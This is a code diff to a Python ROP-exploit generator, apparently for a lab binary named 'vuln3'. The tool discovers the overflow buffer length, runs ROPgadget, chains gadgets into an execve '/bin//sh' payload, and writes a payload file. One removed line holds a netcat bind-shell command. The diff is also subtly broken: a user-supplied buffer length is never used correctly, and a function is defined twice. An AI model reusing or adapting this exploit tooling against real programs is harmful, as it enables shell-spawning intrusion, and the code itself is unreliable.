@@ -7,13 +7,11 @@ BINARY_BITS = 32
 
 BRUTE_FORCE = 0
 BINARY_SEARCH = 1
-ANALYSIS = 2
 
-#COMMAND = "execve(\"/tmp//nc\",\"-lnp\",\"5678\",\"-tte\",\"/bin//sh\", NULL)"
 COMMAND = "execve(\"/bin//sh\")"
 SHELLCODE = ["pop edx", "@ .data", "pop eax", b'/bin', "mov dword ptr [edx], eax", "pop edx", "@ .data + 4", "pop eax", b'//sh', "mov dword ptr [edx], eax", "pop edx", "@ .data + 8", "xor eax, eax", "mov dword ptr [edx], eax", "pop ebx", "@ .data", "pop ecx", "pop ebx", "@ .data + 8", "@ .data", "pop edx", "@ .data + 8", "xor eax, eax"] + ["inc eax"]*11
 PROGRAM = "vuln3"
-FILE_MODE = True
+BUFFLENGTH = -1
 
 def fileCheck(fileloc):
     try:
@@ -24,20 +22,16 @@ def fileCheck(fileloc):
         quit()
 
 def main(args):
-    if len(args) != 3:
-        print("Expected 2 arguments, got " + str(len(args)-1))
-        print("Correct Usage: python S3CW.py BinaryFileLocation ShellcodeFileLocation")
+    if len(args) < 3 or len(args) > 4:
+        print("Expected 2 or 3 arguments, got " + str(len(args)-1))
+        print("Correct Usage: python S3CW.py BinaryFileLocation ShellcodeFileLocation [Buffer Length]")
         quit()
     fileCheck(args[1])
     fileCheck(args[2])
 
     global PROGRAM
     PROGRAM = args[1]
-    program = "./" + PROGRAM
-    if FILE_MODE:
-        program += " "
-    else:
-        program += " < "
+    program = "./" + PROGRAM + " "
 
     global SHELLCODE
     SHELLCODE = []
@@ -49,15 +43,14 @@ def main(args):
             SHELLCODE.append(str(line).rstrip('\n'))
     print(SHELLCODE)
 
-    #STEP 1 - Buffer Discovery
-    bufferLength = bufferDiscovery(BINARY_SEARCH, program)
-    #STEP 2 - Create ROP Chain
-    #ROPchain = createROPchain(COMMAND, bufferLength)
+    global BUFFLENGTH
+    if len(args) == 4:
+        BUFFLENGTH = args[3]
+
+    if BUFFLENGTH == -1:
+        bufferLength = bufferDiscovery(BINARY_SEARCH, program)
+
     ROPchain = makeROPchain(SHELLCODE, bufferLength)
-
-    #STEP 3a - Verify success with known .data
-
-    #STEP 3b - Verify success with random .data
 
 def bufferDiscovery(mode, program):
     global BINARY_BITS
@@ -71,10 +64,6 @@ def bufferDiscovery(mode, program):
             print("Binary Search")
             return binarySearch32(program)
         
-        if(mode == ANALYSIS):
-            #Do Something
-            print("Analysis")
-        
 
     if BINARY_BITS == 64:
         if(mode == BRUTE_FORCE):
@@ -84,10 +73,6 @@ def bufferDiscovery(mode, program):
         if(mode == BINARY_SEARCH):
             print("Binary Search")
             return binarySearch64(program)
-        
-        if(mode == ANALYSIS):
-            #Do Something
-            print("Analysis")
         
 
 def bruteForce32(program):
@@ -166,7 +151,7 @@ def run(program, payload):
 def makeROPchain(shellcode, bufflength):
 
     #Find ROP gadgets
-    #os.system("ROPgadget --binary " + PROGRAM + " > rop.txt")
+    os.system("ROPgadget --binary " + PROGRAM + " > rop.txt")
 
     #Write Shellcode as gadgets
     dictionary = {}
@@ -181,6 +166,14 @@ def makeROPchain(shellcode, bufflength):
     pfile = open("payload", "bw")
     pfile.write(bpayload)
 
+
+def fileCheck(fileloc):
+    try:
+        f = open(fileloc, "r")
+        f.close()
+    except:
+        print("Could not open file " + fileloc + " for read")
+        quit()
 
 if __name__ == "__main__":
     main(sys.argv)
